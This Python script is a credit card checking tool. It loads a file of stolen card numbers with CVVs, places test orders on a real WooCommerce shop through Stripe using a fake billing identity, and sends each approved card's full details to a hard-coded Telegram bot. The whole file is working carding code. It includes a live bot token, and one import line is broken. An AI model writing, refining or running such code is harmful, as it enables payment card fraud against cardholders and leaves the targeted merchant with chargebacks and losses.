import requests
import json
import uuid
from.Concurrent import datetime
import time
import os
import telebot
from colorama import init, Fore, Style
import pyfiglet

# Initialize colorama for colored console output
init()

# Telegram Bot Configuration
BOT_TOKEN = "7526774194:AAEfkkJx0Ii5pGhvdX84rqmitkplgFMU3Ao"
CHAT_ID = "6644761189"
bot = telebot.TeleBot(BOT_TOKEN)

def send_telegram_message(message):
    try:
        bot.send_message(CHAT_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"{Fore.RED}[-] Telegram Error: {str(e)}{Style.RESET_ALL}")

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def check_card(cards):
    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]
    
    session = requests.Session()
    
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=0, i",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    
    req = session.get(
        "https://www.cottonmaskbyjewel.com/product/100-non-woven-polypropylene-face-mask-filter-inserts-1-pack-of-15-pieces-sky-blue/",
        headers=headers,
    )
    
    files = {
        "quantity": (None, "1"),
        "add-to-cart": (None, "1868"),
    }
    req2 = session.post(
        "https://www.cottonmaskbyjewel.com/product/100-non-woven-polypropylene-face-mask-filter-inserts-1-pack-of-15-pieces-sky-blue/",
        headers=headers,
        files=files,
    )
    
    headers3 = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=0, i",
        "referer": "https://www.cottonmaskbyjewel.com/product/100-non-woven-polypropylene-face-mask-filter-inserts-1-pack-of-15-pieces-sky-blue/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    req3 = session.get("https://www.cottonmaskbyjewel.com/checkout/", headers=headers3)
    nonce = parseX(req3.text, 'name="woocommerce-process-checkout-nonce" value="', '"')
    
    headers4 = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "priority": "u=1, i",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    
    data4 = {
        "type": "card",
        "billing_details[name]": "Lupin Lola",
        "billing_details[address][line1]": "245 W 5th Ave",
        "billing_details[address][state]": "AK",
        "billing_details[address][city]": "Anchorage",
        "billing_details[address][postal_code]": "99501",
        "billing_details[address][country]": "US",
        "billing_details[email]": "erminia8058@rowdydow.com",
        "billing_details[phone]": "2125548695",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mon,
        "card[exp_year]": year,
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/b2d52e5892; stripe-js-v3/b2d52e5892; split-card-element",
        "referrer": "https://www.cottonmaskbyjewel.com",
        "time_on_page": "100430",
        "key": "pk_live_51HEk0cIOTyefL8IopQXGLtvnpVA6Vg9nkXtlKF9D3gDYWyFwP6XvmAOceSxCph726Vi9n05cCb5fEp6PMjcJogY800MGImJcyJ",
    }
    req4 = session.post(
        "https://api.stripe.com/v1/payment_methods", headers=headers4, data=data4
    )
    
    pmid = parseX(req4.text, '"id": "', '"')
    
    params = {
        "wc-ajax": "checkout",
    }
    headers5 = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.cottonmaskbyjewel.com",
        "priority": "u=1, i",
        "referer": "https://www.cottonmaskbyjewel.com/checkout/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data5 = {
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_referrer": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://www.cottonmaskbyjewel.com/product/100-non-woven-polypropylene-face-mask-filter-inserts-1-pack-of-15-pieces-sky-blue/",
        "wc_order_attribution_session_start_time": current_time,
        "wc_order_attribution_session_pages": "3",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "billing_first_name": "Lupin",
        "billing_last_name": "Lola",
        "billing_company": "",
        "billing_country": "US",
        "billing_address_1": "245 W 5th Ave",
        "billing_address_2": "",
        "billing_city": "Anchorage",
        "billing_state": "AK",
        "billing_postcode": "99501",
        "billing_phone": "2125548695",
        "billing_email": "erminia8058@rowdydow.com",
        "account_username": "",
        "account_password": "",
        "shipping_first_name": "",
        "shipping_last_name": "",
        "shipping_company": "",
        "shipping_country": "US",
        "shipping_address_1": "",
        "shipping_address_2": "",
        "shipping_city": "",
        "shipping_state": "CA",
        "shipping_postcode": "",
        "shipping_phone": "",
        "order_comments": "",
        "shipping_method[0]": "flat_rate:1",
        "payment_method": "stripe",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "stripe_source": pmid,
    }
    response = session.post(
        "https://www.cottonmaskbyjewel.com/", params=params, headers=headers5, data=data5
    )
    
    parsed_data = json.loads(response.text)
    messages_html = parsed_data.get("messages", "")
    start = '<span class="message-icon icon-close"></span>'
    end = "</div>"
    message = parseX(messages_html, start, end).strip()
    
    return cards, message

def print_banner():
    banner = pyfiglet.figlet_format("@was_done", font="cybermedium")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}{banner}{Style.RESET_ALL}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear console
    print_banner()
    
    print(f"{Fore.CYAN}Enter the full path to your CC combo file{Style.RESET_ALL}")
    combo_file = input(f"{Fore.WHITE}>>> {Style.RESET_ALL}")
    
    if not os.path.exists(combo_file):
        print(f"\n{Fore.RED}[!] File '{combo_file}' not found!{Style.RESET_ALL}")
        return
    
    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            combos = f.readlines()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error reading file: {str(e)}{Style.RESET_ALL}")
        return
    
    total_cards = len(combos)
    print(f"\n{Fore.GREEN}[+] Loaded {total_cards} cards{Style.RESET_ALL}")
    
    hits = 0
    declines = 0
    
    for i, card in enumerate(combos, 1):
        card = card.strip()
        if not card:
            continue
            
        cc, mon, year, cvv = card.split("|")
        date_str = f"{mon}/{year[-2:]}"
        current_date = datetime.now().strftime("%m/%Y/%d")
        
        try:
            card_details, result = check_card(card)
            status = "Approved" if "Payment Success" in result or "Order has been placed" in result else result
            is_approved = "Payment Success" in result or "Order has been placed" in result
            
            # Format the output similar to the image
            line = f"{Fore.WHITE}{card_details} {date_str} {cvv} | {current_date} | "
            if is_approved:
                hits += 1
                line += f"{Fore.GREEN}Approved {'(CVV)' if 'CVV' in result else '(CCN)'} ✔{Style.RESET_ALL}"
                telegram_msg = f"💰 <b>HIT</b>\nCard: {card_details}\nDate: {date_str}\nCVV: {cvv}\nResponse: {result}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                send_telegram_message(telegram_msg)
            else:
                declines += 1
                line += f"{Fore.RED}{status} ✘{Style.RESET_ALL}"
            
            print(line)
            
        except Exception as e:
            declines += 1
            print(f"{Fore.WHITE}{card_details} {date_str} {cvv} | {current_date} | {Fore.RED}Error: {str(e)} ✘{Style.RESET_ALL}")
            
        time.sleep(2)
    
    print(f"\n{Fore.CYAN}Total: {total_cards} | Hits: {hits} | Declines: {declines}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()